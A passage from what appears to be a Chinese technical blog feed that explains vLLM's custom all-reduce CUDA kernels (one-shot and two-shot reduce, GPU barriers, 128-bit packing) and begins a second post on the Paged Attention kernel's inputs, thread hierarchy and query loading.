的情况，会使用一阶段 allreduce <code>cross_device_reduce_1stage</code>，反之选择二阶段 <code>cross_device_reduce_2stage</code>。</p><p>CUDA kernel 函数的 blocks 和 threads 是作者试验出来的，他在 A100，A10，A30 和 T4 上尝试了多次，最终选择 36 个 blocks 以获得最好的性能。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++">    size /= d;<br>    <span class="hljs-keyword">auto</span> bytes = size * <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">typename</span> <span class="hljs-type">packed_t</span>&lt;T&gt;::P);<br>    <span class="hljs-type">int</span> blocks = std::<span class="hljs-built_in">min</span>(block_limit, (size + threads - <span class="hljs-number">1</span>) / threads);<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KL(ngpus, name)                                                       \</span><br><span class="hljs-meta">  name<span class="hljs-string">&lt;T, ngpus&gt;</span><span class="hljs-string">&lt;&lt;&lt;blocks, threads, 0, stream&gt;</span>&gt;&gt;(ptrs, sg_, self_sg_, output, \</span><br><span class="hljs-meta">                                                 rank_, size);</span><br>    <span class="hljs-comment">// TODO(hanzhi713): Threshold is different for A100 and H100.</span><br>    <span class="hljs-comment">// Add per device threshold.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REDUCE_CASE(ngpus)                            \</span><br><span class="hljs-meta">  case ngpus: &#123;                                       \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (world_size_ == 2) &#123;                           \</span><br><span class="hljs-meta">      KL(ngpus, cross_device_reduce_1stage);          \</span><br><span class="hljs-meta">    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (full_nvlink_) &#123;                        \</span><br><span class="hljs-meta">      <span class="hljs-keyword">if</span> ((world_size_ &lt;= 4 &amp;&amp; bytes &lt; 512 * 1024) || \</span><br><span class="hljs-meta">          (world_size_ &lt;= 8 &amp;&amp; bytes &lt; 256 * 1024)) &#123; \</span><br><span class="hljs-meta">        KL(ngpus, cross_device_reduce_1stage);        \</span><br><span class="hljs-meta">      &#125; <span class="hljs-keyword">else</span> &#123;                                        \</span><br><span class="hljs-meta">        KL(ngpus, cross_device_reduce_2stage);        \</span><br><span class="hljs-meta">      &#125;                                               \</span><br><span class="hljs-meta">    &#125;                                                 \</span><br><span class="hljs-meta">    break;                                            \</span><br><span class="hljs-meta">  &#125;</span><br><br>    <span class="hljs-keyword">switch</span> (world_size_) &#123;<br>      <span class="hljs-built_in">REDUCE_CASE</span>(<span class="hljs-number">2</span>)<br>      <span class="hljs-built_in">REDUCE_CASE</span>(<span class="hljs-number">4</span>)<br>      <span class="hljs-built_in">REDUCE_CASE</span>(<span class="hljs-number">6</span>)<br>      <span class="hljs-built_in">REDUCE_CASE</span>(<span class="hljs-number">8</span>)<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(...)<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> REDUCE_CASE</span><br><span class="hljs-meta">#<span class="hljs-keyword">undef</span> KL</span><br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="cross-device-reduce-实现">cross_device_reduce 实现</h3><p>cross_device_reduce_1stage 代码实现如下：首先要保证所有的节点都在执行 allreduce 前同步，<code>multi_gpu_barrier&lt;ngpus, true&gt;()</code> 会首先将 <code>vll::Signal</code> 数组执行信号同步，随后同步 block 内线程。之所以用 <code>vll::Signal</code> 做信号同步，是因为代码中会出现两次 <code>multi_gpu_barrier</code>，为了防止节点间速度不一致导致的在不同 <code>multi_gpu_barrier</code> 函数上同步。比如若没有  <code>vll::Signal</code>，节点 1 在第二个 <code>multi_gpu_barrier</code> 同步，而节点 2 还未达到第一个 <code>multi_gpu_barrier</code>，然后他们同步后接着往下走，就会出现程序死锁或者 bug。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> ngpus&gt;<br>__global__ <span class="hljs-type">void</span> __launch_bounds__(<span class="hljs-number">512</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">cross_device_reduce_1stage</span>(RankData* _dp, RankSignals sg, Signal* self_sg,<br>                               T* __restrict__ result, <span class="hljs-type">int</span> rank, <span class="hljs-type">int</span> size) &#123;<br>  <span class="hljs-keyword">using</span> P = <span class="hljs-keyword">typename</span> <span class="hljs-type">packed_t</span>&lt;T&gt;::P;<br>  <span class="hljs-keyword">using</span> A = <span class="hljs-keyword">typename</span> <span class="hljs-type">packed_t</span>&lt;T&gt;::A;<br>  <span class="hljs-comment">// note: we don&#x27;t reorder the address so the accumulation order is the same</span><br>  <span class="hljs-comment">// for all ranks, ensuring bitwise identical results</span><br>  <span class="hljs-keyword">auto</span> dp = *_dp;<br>  <span class="hljs-built_in">multi_gpu_barrier</span>&lt;ngpus, <span class="hljs-literal">true</span>&gt;(sg, self_sg, rank);<br>  <span class="hljs-comment">// do the actual reduction</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> idx = blockIdx.x * blockDim.x + threadIdx.x; idx &lt; size;<br>       idx += gridDim.x * blockDim.x) &#123;<br>    ((P*)result)[idx] = <span class="hljs-built_in">packed_reduce</span>&lt;P, ngpus, A&gt;((<span class="hljs-type">const</span> P**)&amp;dp.ptrs[<span class="hljs-number">0</span>], idx);<br>  &#125;<br>  <span class="hljs-built_in">multi_gpu_barrier</span>&lt;ngpus, <span class="hljs-literal">false</span>&gt;(sg, self_sg, rank);<br>&#125;<br></code></pre></td></tr></table></figure><p>对于 two-shot allreduce，执行步骤会稍显复杂。首先，程序将每个节点的数据分成了 <code>ngpus</code> 份，然后按照节点 <code>rank</code> 号分配好指针位置，再将数据通过 reduce 的方式求和存入到 <code>tmp</code> 数组中。经过第二个 <code>multi_gpu_barrier</code> 后，执行 allgather，第 i part 部分的数据会从第 i 个节点过来，所以 i 号节点需要遍历 <code>ngpus</code> 遍，将其他节点的数据都 gather 起来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> ngpus&gt;<br>__global__ <span class="hljs-type">void</span> __launch_bounds__(<span class="hljs-number">512</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">cross_device_reduce_2stage</span>(RankData* _dp, RankSignals sg, Signal* self_sg,<br>                               T* __restrict__ result, <span class="hljs-type">int</span> rank, <span class="hljs-type">int</span> size) &#123;<br>  <span class="hljs-type">int</span> tid = blockIdx.x * blockDim.x + threadIdx.x;<br>  <span class="hljs-type">int</span> stride = gridDim.x * blockDim.x;<br>  <span class="hljs-keyword">using</span> P = <span class="hljs-keyword">typename</span> <span class="hljs-type">packed_t</span>&lt;T&gt;::P;<br>  <span class="hljs-keyword">using</span> A = <span class="hljs-keyword">typename</span> <span class="hljs-type">packed_t</span>&lt;T&gt;::A;<br>  <span class="hljs-type">int</span> part = size / ngpus;<br>  <span class="hljs-type">int</span> start = rank * part;<br>  <span class="hljs-type">int</span> end = rank == ngpus - <span class="hljs-number">1</span> ? size : start + part;<br>  <span class="hljs-type">int</span> largest_part = part + size % ngpus;<br>  <span class="hljs-type">const</span> P* ptrs[ngpus];<br>  P* tmps[ngpus];<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ngpus; i++) &#123;<br>    <span class="hljs-type">int</span> target = (rank + i) % ngpus;<br>    ptrs[i] = (<span class="hljs-type">const</span> P*)_dp-&gt;ptrs[target];<br>    tmps[i] = <span class="hljs-built_in">get_tmp_buf</span>&lt;P&gt;(sg.signals[target]);<br>  &#125;<br>  <span class="hljs-keyword">auto</span> tmp_out = tmps[<span class="hljs-number">0</span>];<br>  <span class="hljs-built_in">multi_gpu_barrier</span>&lt;ngpus, <span class="hljs-literal">true</span>&gt;(sg, self_sg, rank);<br>  <span class="hljs-comment">// stage 1: reduce scatter</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> idx = start + tid; idx &lt; end; idx += stride) &#123;<br>    tmp_out[idx - start] = <span class="hljs-built_in">packed_reduce</span>&lt;P, ngpus, A&gt;(ptrs, idx);<br>  &#125;<br>  <span class="hljs-built_in">multi_gpu_barrier</span>&lt;ngpus, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>&gt;(sg, self_sg, rank);<br><br>  <span class="hljs-comment">// stage 2: allgather</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> idx = tid; idx &lt; largest_part; idx += stride) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ngpus; i++) &#123;<br>      <span class="hljs-type">int</span> gather_from_rank = ((rank + i) % ngpus);<br>      <span class="hljs-keyword">if</span> (gather_from_rank == ngpus - <span class="hljs-number">1</span> || idx &lt; part) &#123;<br>        <span class="hljs-type">int</span> dst_idx = gather_from_rank * part + idx;<br>        ((P*)result)[dst_idx] = tmps[i][idx];<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>倘若你理解了前文所说 one-shot allreduce 和 two-shot allreduce 的实现原理，那么上面部分的 CUDA 代码实现其实非常简单，但难在如何写出高性能的代码。本着学习的态度，我仔细研究并总结了以下优化细节：</p><ul><li><p><code>packed_t</code> 中对齐 128 bits 的实现。有利于线程更快 load 数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> sz&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">__align__</span>(<span class="hljs-built_in">alignof</span>(T) * sz) <span class="hljs-type">array_t</span> &#123;<br>  T data[sz];<br>  <span class="hljs-keyword">using</span> type = T;<br>  <span class="hljs-type">static</span> <span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> size = sz;<br>&#125;;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">packed_t</span> &#123;<br>  <span class="hljs-comment">// the (P)acked type for load/store</span><br>  <span class="hljs-keyword">using</span> P = <span class="hljs-type">array_t</span>&lt;T, <span class="hljs-number">16</span> / <span class="hljs-built_in">sizeof</span>(T)&gt;;<br>  <span class="hljs-comment">// the (A)ccumulator type for reduction</span><br>  <span class="hljs-keyword">using</span> A = <span class="hljs-type">array_t</span>&lt;<span class="hljs-type">float</span>, <span class="hljs-number">16</span> / <span class="hljs-built_in">sizeof</span>(T)&gt;;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>嵌入 cuda ptx 代码，同样地，为了保证 128 bits 对齐，使用 u32 指令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">static</span> DINLINE <span class="hljs-type">void</span> <span class="hljs-title">st_flag_volatile</span><span class="hljs-params">(FlagType* flag_addr, FlagType flag)</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;st.volatile.global.u32 [%1], %0;&quot;</span> ::<span class="hljs-string">&quot;r&quot;</span>(flag), <span class="hljs-string">&quot;l&quot;</span>(flag_addr))</span></span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> DINLINE FlagType <span class="hljs-title">ld_flag_volatile</span><span class="hljs-params">(FlagType* flag_addr)</span> </span>&#123;<br>  FlagType flag;<br>  <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;ld.volatile.global.u32 %0, [%1];&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">              : <span class="hljs-string">&quot;=r&quot;</span>(flag)</span></span><br><span class="hljs-params"><span class="hljs-function">              : <span class="hljs-string">&quot;l&quot;</span>(flag_addr))</span></span>;<br>  <span class="hljs-keyword">return</span> flag;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用低精度做计算，后转到高精度 float</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> P, <span class="hljs-type">int</span> ngpus, <span class="hljs-keyword">typename</span> A&gt;<br><span class="hljs-function">DINLINE P <span class="hljs-title">packed_reduce</span><span class="hljs-params">(<span class="hljs-type">const</span> P* ptrs[], <span class="hljs-type">int</span> idx)</span> </span>&#123;<br>  A tmp = <span class="hljs-built_in">upcast</span>(ptrs[<span class="hljs-number">0</span>][idx]);<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; ngpus; i++) &#123;<br>    <span class="hljs-built_in">packed_assign_add</span>(tmp, <span class="hljs-built_in">upcast</span>(ptrs[i][idx]));<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">downcast</span>&lt;P&gt;(tmp);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>循环充分展开，比如</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ngpus; i++) &#123;<br>    <span class="hljs-type">int</span> gather_from_rank = ((rank + i) % ngpus);<br>    <span class="hljs-keyword">if</span> (gather_from_rank == ngpus - <span class="hljs-number">1</span> || idx &lt; part) &#123;<br>      <span class="hljs-type">int</span> dst_idx = gather_from_rank * part + idx;<br>      ((P*)result)[dst_idx] = tmps[i][idx];<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VLLM Paged Attention 实现</title>
    <link href="/2024/08/02/2024-5-9-vllm/"/>
    <url>/2024/08/02/2024-5-9-vllm/</url>
    
    <content type="html"><![CDATA[<h1>Paged Attention 简介</h1><p>Paged Attention 是 vllm <strong>在 decode 阶段</strong>用来解决 KV cache 利用率不高的加速技术。它仿照了操作系统中经典的分页技术（paging）。Paged Attention 通过切分一个 sequence 序列中的 KV cache 为多个 KV blocks 的方法，允许在非连续的内存空间存储连续的 key 和 value。每一个 KV block 会存储一定数量 tokens 的 K，V 向量，这样就将原本 KV cache 切分成一块块 KV blocks，如下图所示：</p><p><img src="/img/LLM/vllm_page_attn.webp" alt=""></p><p>为了获得更快的性能，VLLM 针对 attention kernel 有专门的内存布局和访问设计，尤其是线程从全局内存中读取数据到共享内存的环节。</p><p>今天，我们来一起看一下 VLLM 对于 Paged Attention 的具体实现细节，本文参考 <a href="https://docs.vllm.ai/en/stable/dev/kernel/paged_attention.html">vLLM Paged Attention</a>。本文涉及到的 VLLM 代码版本为 0.5.3。</p><h1>输入</h1><p>先来看一下 paged_attention_kernel 的总入口：我们先要理解一下函数的输入输出情况</p><h2 id="paged-attention-kernel-的声明">paged_attention_kernel 的声明</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<br>  <span class="hljs-keyword">typename</span> <span class="hljs-type">scalar_t</span>,<br>  <span class="hljs-keyword">typename</span> <span class="hljs-type">cache_t</span>,<br>  <span class="hljs-type">int</span> HEAD_SIZE,<br>  <span class="hljs-type">int</span> BLOCK_SIZE,<br>  <span class="hljs-type">int</span> NUM_THREADS,<br>  <span class="hljs-type">bool</span> IS_FP8_E5M2_KV_CACHE,<br>  <span class="hljs-type">int</span> PARTITION_SIZE = <span class="hljs-number">0</span>&gt; <span class="hljs-comment">// Zero means no partitioning.</span><br>__device__ <span class="hljs-type">void</span> <span class="hljs-built_in">paged_attention_kernel</span>(<br>  <span class="hljs-type">float</span>* __restrict__ exp_sums,           <span class="hljs-comment">// [num_seqs, num_heads, max_num_partitions]</span><br>  <span class="hljs-type">float</span>* __restrict__ max_logits,         <span class="hljs-comment">// [num_seqs, num_heads, max_num_partitions]</span><br>  <span class="hljs-type">scalar_t</span>* __restrict__ out,             <span class="hljs-comment">// [num_seqs, num_heads, max_num_partitions, head_size]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">scalar_t</span>* __restrict__ q,         <span class="hljs-comment">// [num_seqs, num_heads, head_size]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">cache_t</span>* __restrict__ k_cache,    <span class="hljs-comment">// [num_blocks, num_kv_heads, head_size/x, block_size, x]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">cache_t</span>* __restrict__ v_cache,    <span class="hljs-comment">// [num_blocks, num_kv_heads, head_size, block_size]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> num_kv_heads,                 <span class="hljs-comment">// [num_heads]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">float</span> scale,<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span>* __restrict__ block_tables,   <span class="hljs-comment">// [num_seqs, max_num_blocks_per_seq]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span>* __restrict__ context_lens,   <span class="hljs-comment">// [num_seqs]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> max_num_blocks_per_seq,<br>  <span class="hljs-type">const</span> <span class="hljs-type">float</span>* __restrict__ alibi_slopes, <span class="hljs-comment">// [num_heads]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> q_stride,<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> kv_block_stride,<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> kv_head_stride,<br>  <span class="hljs-type">const</span> <span class="hljs-type">float</span> k_scale, <span class="hljs-type">const</span> <span class="hljs-type">float</span> v_scale, <span class="hljs-type">const</span> <span class="hljs-type">int</span> tp_rank,<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> blocksparse_local_blocks, <span class="hljs-type">const</span> <span class="hljs-type">int</span> blocksparse_vert_stride,<br>  <span class="hljs-type">const</span> <span class="hljs-type">int</span> blocksparse_block_size, <span class="hljs-type">const</span> <span class="hljs-type">int</span> blocksparse_head_sliding_step)<br></code></pre></td></tr></table></figure><p>可见，该 kernel 函数需要读入许多参数，用于当前线程执行。其中最重要的三个参数是输入指针 <code>q</code>、<code>k_cache</code> 和 <code>v_cache</code>，它们指向全局内存中需要读取和处理的 query、key 和 value 数据，输出指针 <code>out</code> 指向全局内存，结果会存放在该处。这四个指针实际上是多维数组的引用，但每个线程只访问分配给它的数据部分。</p><p>在函数声明中，还有一系列的模板参数值得我们注意，这些参数是在编译时确定的。<code>scalar_t</code> 表示 query、key 和 value 数据元素的数据类型，例如 FP16。<code>HEAD_SIZE</code> 表示每个头部中元素的数量。<code>BLOCK_SIZE</code> 指的是每个块中 token 的数量。<code>NUM_THREADS</code> 表示每个线程块中线程的数量。<code>PARTITION_SIZE</code> 代表张量并行GPU的数量（为简单起见，后文都假设此值为0，即禁用了张量并行）。</p><p>从注释中，我们获得了几个有用信息：</p><table><thead><tr><th>张量名字</th><th>维度</th><th>描述</th></tr></thead><tbody><tr><td>out</td><td>(num_seqs, num_heads, head_size)</td><td>注意力计算结果</td></tr><tr><td>q</td><td>(num_seqs, num_heads, head_size)</td><td>query 张量</td></tr><tr><td>k_cache</td><td>(num_blocks, num_kv_heads, head_size/x, block_size, x)</td><td>key cache 张量</td></tr><tr><td>v_cache</td><td>(num_blocks, num_kv_heads, head_size, block_size)</td><td>value cache 张量</td></tr></tbody></table><p>了解完函数的输入后，我想先解释一些后续部分需要用到的概念。对基本概念的完全理解可以帮助我们更好地理解代码实现</p><h1>概念</h1><p>如果你遇到任何困惑的术语，你可以跳过这一节并稍后返回。</p><ul><li><p><strong>Sequence</strong>：Sequence 可以理解为客户端的一个请求，包括了与大模型对话的语句。例如，由 <code>q</code> 指向的数据具有形状 <code>[num_seqs, num_heads, head_size]</code>。这表示总共有 <code>num_seqs</code> 个查询 sequence 数据被 <code>q</code> 指向。由于 paged attention kernel 只是一个<strong>在 decode 阶段</strong>才会被使用的注意力函数，因此计算时每个 sequence 只会有一个 query token。因此，<code>num_seqs</code> 等于 batch 中处理的所有 token 总数。</p></li><li><p><strong>Context</strong>：context 包括从 sequence 已经生成的 tokens。例如，<code>[&quot;What&quot;, &quot;is&quot;, &quot;your&quot;]</code> 是已经产生的 context token，输入 query token 为 <code>&quot;name&quot;</code>。那么下一步，模型可能会生成 token <code>&quot;?&quot;</code>。</p></li><li><p><strong>Vec</strong>：vec 是被<strong>一个线程</strong>一起的 load 到内存并执行计算的元素数组。对于 query 和 key 张量，vec 大小（<code>VEC_SIZE</code>）是通过计算一个 thread group 一次 load 和计算 16 字节单位的数据多少来确定的。对于 value 张量，则根据一个 thread 一次 load 和计算 16 字节数据量来确定 <code>V_VEC_SIZE</code> 大小。例如，如果 <code>scalar_t</code> 为 FP16（2字节）且 <code>THREAD_GROUP_SIZE</code> 为 2，则 <code>VEC_SIZE</code> 将为 16/2/2=4，而 <code>V_VEC_SIZE</code> 将为 16/2=8。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">constexpr</span> <span class="hljs-type">int</span> VEC_SIZE = <span class="hljs-built_in">MAX</span>(<span class="hljs-number">16</span> / (THREAD_GROUP_SIZE * <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">scalar_t</span>)), <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><ul><li><p><strong>Thread group</strong>：Thread group 就是一小组(<code>THREAD_GROUP_SIZE</code> 个)线程，它们一次 load 并计算一个 query 和 key token 的 QK。注意：Thread group 中的一个线程只处理一部分 token 数据！下面的图示中我们会看到这样的例子。而又因为一个 token 向量维度往往较大，会在 cacheline 上跨越多个 bank，所以线程读取数据时更偏向于条状方式（tiled）读取。我们将一个 thread group 处理的元素总数记为 <code>x</code>。例如，如果线程组包含 2 个线程，并且 head size 为 8，那么 thread 0 处理会index 为 0、2、4、6 的 query 和 key token，而 thread 1 处理 index 为 1、3、5、7 的 token。</p></li><li><p><strong>Block</strong>：vLLM paged attention 最关键的实现就是分块存储 key value。每个 block 存储了固定数量(<code>BLOCK_SIZE</code>个 head token) 的 tokens。注意，一个 Block 里的 token 是不完整的，是只包括了一个注意力头的 token 数据！每个 block 可能只包含 context 中部分的 tokens。例如，如果 block 大小是 16，head size 是 128，那么对于一个注意力头，一个 block 包含了 16*128=2048 个元素。相比之下，大模型一层 transformer 可能有 32 个注意力头，hidden size 为 4096（即 token 向量维度）。</p></li><li><p><strong>Warp</strong>：CUDA中，一个 warp 包含了 32 个线程（<code>WARP_SIZE</code>），它们在流多处理器（SM）上同时执行。在这个 kernel 中，每个 warp 一次处理一个 query token 和整块的 key tokens 之间的计算（可能会在多次迭代中处理多个块）。例如，如果有 4 个 warps 和 6 个 blocks 用于一个 context，则分配如下：warp 0 处理第 0、4 号块，warp 1 处理第 1、5 号块，warp 2处理第2号块，而warp 3 则处理第 3 号块。</p></li><li><p><strong>Thread block</strong>：线程块是一组可以访问相同共享内存的线程（<code>NUM_THREADS</code>）。每个线程块包含多个 warps（<code>NUM_WARPS</code>），在本 kernel 函数中，一个线程块处理一个 query token 和整个 context 的 key tokens 的计算。</p></li><li><p><strong>Grid</strong>： grid 由线程块组成，在本 kernel 函数中，grid 的维度为 <code>(num_heads, num_seqs, max_num_partitions)</code>。因此，每个线程块只负责处理一个头部、一个 sequence 的一个分部。当然，我们这里先假设 partitions 为 1，不分部。</p></li></ul><h2 id="线程与数据的布局层次">线程与数据的布局层次</h2><table><thead><tr><th>线程层次</th><th>数据层次</th><th>备注</th></tr></thead><tbody><tr><td>Grid</td><td>batch 内所有 sequence</td><td>一次计算 num_seqs   个 sequence</td></tr><tr><td>Thread Block</td><td>sequence</td><td>一次计算 一个 query 和整个context 的 key tokens</td></tr><tr><td>Warp</td><td>KV block token</td><td>一次计算一个 query 与整块 key token</td></tr><tr><td>Thread group</td><td>token</td><td>一次计算一个 query 与一个 key token</td></tr><tr><td>Thread</td><td>part of token</td><td>一次计算部分 query 与 部分 key token</td></tr></tbody></table><h1>Query</h1><p>这一节来介绍一下 query 张量的内存布局以及如何被线程 load 并计算的过程。上文提到过，每个 thread group 会 load 一个完整的 query token 张量，因此分摊到每个线程只会 load 部分 token 张量。而在一个 warp 中，所有的 thread group 都会 load 相同的 query token 张量，同时也会 load 多个同一 KV block 内的不同的 key token 张量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">scalar_t</span>* q_ptr = q + seq_idx * q_stride + head_idx * HEAD_SIZE;<br></code></pre></td></tr></table></figure><p><img src="https://docs.vllm.ai/en/stable/_images/query.png" alt=""></p><p>上图所示的是一个注意力头中，一个 query token 的数据，当 <code>VEC_SIZE</code> 是 4，<code>HEAD_SIZE</code> 是 128, 那么就包含了一共 128 / 4 = 32 vecs。在每个线程内，定义了一个线程私有的 <code>q_ptr</code>，指向它需要 load 的 query token 数据，见下图，每一行都是一个线程 load 的 token 数据。</p><p><img src="https://docs.vllm.ai/en/stable/_images/q_vecs.png" alt=""></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 